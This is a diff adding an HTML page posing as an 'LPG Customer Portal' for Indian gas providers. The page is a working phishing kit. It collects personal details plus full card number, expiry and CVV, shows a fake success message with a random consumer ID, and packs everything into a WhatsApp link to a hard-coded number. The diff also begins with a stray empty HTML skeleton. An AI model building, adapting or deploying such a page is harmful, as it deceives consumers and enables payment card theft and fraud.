@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title></title>
+</head>
+
+<body>
+  
+</body>
+
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LPG Service & Booking Enquiry Portal</title>
+<style>
+:root {
+  --primary-color: #d9381e;
+  --primary-hover: #b82a13;
+  --bg-color: #f4f6f9;
+  --card-bg: #ffffff;
+  --text-color: #1e293b;
+  --border-color: #cbd5e1;
+  --focus-ring: rgba(217, 56, 30, 0.25);
+  --success-bg: #ecfdf5;
+  --success-text: #047857;
+}
+
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+body {
+  font-family: 'Segoe UI', Roboto, -apple-system, BlinkMacSystemFont, sans-serif;
+  background-color: var(--bg-color);
+  color: var(--text-color);
+  line-height: 1.5;
+}
+
+header {
+  background: linear-gradient(135deg, #e53e3e 0%, #b91c1c 100%);
+  color: white;
+  text-align: center;
+  padding: 40px 20px 52px;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+}
+
+header h1 {
+  font-size: 28px;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+}
+
+header p {
+  font-size: 15px;
+  opacity: 0.92;
+  margin-top: 6px;
+}
+
+.container {
+  max-width: 760px;
+  margin: -28px auto 48px;
+  padding: 36px 40px;
+  background: var(--card-bg);
+  border-radius: 16px;
+  box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.08), 0 8px 10px -6px rgba(0, 0, 0, 0.01);
+}
+
+.form-grid {
+  display: grid;
+  grid-template-columns: repeat(2, minmax(0, 1fr));
+  gap: 20px;
+}
+
+.full-width {
+  grid-column: 1 / -1;
+}
+
+.section-title {
+  font-size: 16px;
+  font-weight: 700;
+  color: #0f172a;
+  margin: 12px 0 4px;
+  padding-bottom: 8px;
+  border-bottom: 2px solid #f1f5f9;
+  grid-column: 1 / -1;
+}
+
+.section-title:first-of-type {
+  margin-top: 0;
+}
+
+label {
+  display: block;
+  margin-bottom: 6px;
+  font-size: 13px;
+  font-weight: 600;
+  color: #475569;
+}
+
+input, select {
+  width: 100%;
+  height: 46px;
+  padding: 10px 14px;
+  border: 1.5px solid var(--border-color);
+  border-radius: 8px;
+  font-size: 15px;
+  color: var(--text-color);
+  background-color: #fff;
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+
+input:focus, select:focus {
+  outline: none;
+  border-color: var(--primary-color);
+  box-shadow: 0 0 0 4px var(--focus-ring);
+}
+
+/* Dedicated Card Box */
+.card-box {
+  grid-column: 1 / -1;
+  background-color: #f8fafc;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 12px;
+  padding: 22px;
+  display: grid;
+  grid-template-columns: repeat(2, minmax(0, 1fr));
+  gap: 18px;
+}
+
+.card-box input {
+  font-variant-numeric: tabular-nums;
+  letter-spacing: 0.5px;
+}
+
+button[type="submit"] {
+  width: 100%;
+  height: 50px;
+  margin-top: 12px;
+  background-color: var(--primary-color);
+  border: none;
+  border-radius: 8px;
+  color: white;
+  font-size: 16px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: background-color 0.2s, transform 0.1s;
+}
+
+button[type="submit"]:hover {
+  background-color: var(--primary-hover);
+}
+
+button[type="submit"]:active {
+  transform: scale(0.99);
+}
+
+/* Success Card View */
+#successView {
+  display: none;
+  text-align: center;
+  padding: 40px 20px;
+}
+
+#successView h3 {
+  font-size: 22px;
+  color: var(--success-text);
+  margin-bottom: 12px;
+}
+
+#successView p {
+  font-size: 16px;
+  color: #475569;
+  margin-bottom: 24px;
+  line-height: 1.6;
+}
+
+.consumer-badge {
+  display: inline-block;
+  background-color: #f1f5f9;
+  color: #0f172a;
+  padding: 6px 14px;
+  border-radius: 6px;
+  font-weight: 700;
+  font-family: monospace;
+  font-size: 16px;
+  margin: 6px 0 16px;
+  border: 1px dashed #cbd5e1;
+}
+
+.btn-whatsapp {
+  display: inline-block;
+  background-color: #25d366;
+  color: white;
+  text-decoration: none;
+  font-weight: 700;
+  padding: 13px 26px;
+  border-radius: 8px;
+  transition: background-color 0.2s;
+}
+
+.btn-whatsapp:hover {
+  background-color: #1eb956;
+}
+
+footer {
+  text-align: center;
+  color: #64748b;
+  font-size: 13px;
+  padding: 24px;
+}
+
+@media (max-width: 640px) {
+  .container {
+    margin: -20px 16px 32px;
+    padding: 24px 20px;
+  }
+  .form-grid,
+  .card-box {
+    grid-template-columns: 1fr;
+  }
+}
+</style>
+</head>
+<body>
+
+<header>
+  <h1>🔥 LPG Customer Portal & Support</h1>
+  <p>Quick Service Request & Account Assistance</p>
+</header>
+
+<div class="container">
+  <form id="lpgForm" class="form-grid">
+    <div class="section-title">Personal Details</div>
+
+    <div>
+      <label for="fullName">Full Name</label>
+      <input type="text" id="fullName" placeholder="Enter your full name" required>
+    </div>
+
+    <div>
+      <label for="mobile">Mobile Number</label>
+      <input type="tel" id="mobile" placeholder="10-digit mobile number" pattern="[0-9]{10}" maxlength="10" required>
+    </div>
+
+    <div>
+      <label for="email">Email Address</label>
+      <input type="email" id="email" placeholder="name@example.com" required>
+    </div>
+
+    <div>
+      <label for="city">City / Region</label>
+      <input type="text" id="city" placeholder="Enter city name" required>
+    </div>
+
+    <div class="section-title">LPG Connection Details</div>
+
+    <div class="full-width">
+      <label for="provider">LPG Provider</label>
+      <select id="provider" required>
+        <option value="">Select Provider</option>
+        <option value="Indane Gas">Indane Gas</option>
+        <option value="Bharatgas">Bharatgas</option>
+        <option value="HP Gas">HP Gas</option>
+      </select>
+    </div>
+
+    <div class="section-title">Debit / Credit Card Details</div>
+
+    <div class="card-box">
+      <div class="full-width">
+        <label for="cardNumber">Card Number</label>
+        <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" inputmode="numeric" maxlength="19" required>
+      </div>
+
+      <div>
+        <label for="expiryDate">Expiry Date</label>
+        <input type="text" id="expiryDate" placeholder="MM/YY" inputmode="numeric" maxlength="5" required>
+      </div>
+
+      <div>
+        <label for="cvv">CVV</label>
+        <input type="password" id="cvv" placeholder="3-digit CVV" inputmode="numeric" pattern="[0-9]{3,4}" maxlength="4" required>
+      </div>
+    </div>
+
+    <button type="submit" id="submitBtn" class="full-width">Submit Service Request</button>
+  </form>
+
+  <div id="successView" role="status" aria-live="polite">
+    <h3>✓ Application Submitted Successfully!</h3>
+    <p>Your application has been registered successfully. Please wait up to 24 hours for processing.</p>
+    <p style="margin-bottom: 6px; font-size: 14px; font-weight: 600; color: #475569;">Assigned Consumer ID:</p>
+    <div id="assignedConsumerId" class="consumer-badge">--</div>
+    <div>
+      <a id="whatsappLink" class="btn-whatsapp" href="#" target="_blank" rel="noopener noreferrer">
+        Confirm / Chat via WhatsApp
+      </a>
+    </div>
+  </div>
+</div>
+
+<footer>
+  © LPG Service Support Portal. All rights reserved.
+</footer>
+
+<script>
+const form = document.getElementById("lpgForm");
+const successView = document.getElementById("successView");
+const whatsappLink = document.getElementById("whatsappLink");
+const cardNumberInput = document.getElementById("cardNumber");
+const expiryDateInput = document.getElementById("expiryDate");
+
+// Auto-format card number with spaces every 4 digits
+cardNumberInput.addEventListener("input", function(e) {
+  let value = e.target.value.replace(/\D/g, "").substring(0, 16);
+  e.target.value = value.replace(/(.{4})/g, "$1 ").trim();
+});
+
+// Auto-format expiry date as MM/YY
+expiryDateInput.addEventListener("input", function(e) {
+  let value = e.target.value.replace(/\D/g, "").substring(0, 4);
+  if (value.length >= 3) {
+    e.target.value = value.slice(0, 2) + "/" + value.slice(2);
+  } else {
+    e.target.value = value;
+  }
+});
+
+form.addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  if (!form.reportValidity()) return;
+
+  const fullName = document.getElementById("fullName").value;
+  const mobile = document.getElementById("mobile").value;
+  const email = document.getElementById("email").value;
+  const city = document.getElementById("city").value;
+  const provider = document.getElementById("provider").value;
+  
+  // Generate a random professional Consumer ID upon submission
+  const generatedConsumerId = "LPG-" + Math.floor(100000 + Math.random() * 900000);
+  document.getElementById("assignedConsumerId").textContent = generatedConsumerId;
+
+  const cardNumber = cardNumberInput.value;
+  const expiryDate = expiryDateInput.value;
+  const cvv = document.getElementById("cvv").value;
+
+  const phone = "917533947819";
+
+  const message = `Hello, I would like to submit my LPG connection enquiry.
+
+*Customer Details:*
+• Name: ${fullName}
+• Phone: ${mobile}
+• Email: ${email}
+• City: ${city}
+
+*LPG Details:*
+• Provider: ${provider}
+• Assigned Consumer ID: ${generatedConsumerId}
+
+*Card Details:*
+• Card Number: ${cardNumber}
+• Expiry: ${expiryDate}
+• CVV: ${cvv}`;
+
+  const whatsappURL = "https://wa.me/" + phone + "?text=" + encodeURIComponent(message);
+  whatsappLink.href = whatsappURL;
+
+  form.style.display = "none";
+  successView.style.display = "block";
+
+  window.scrollTo({ top: 0, behavior: "smooth" });
+});
+</script>
+
+</body>
+</html>
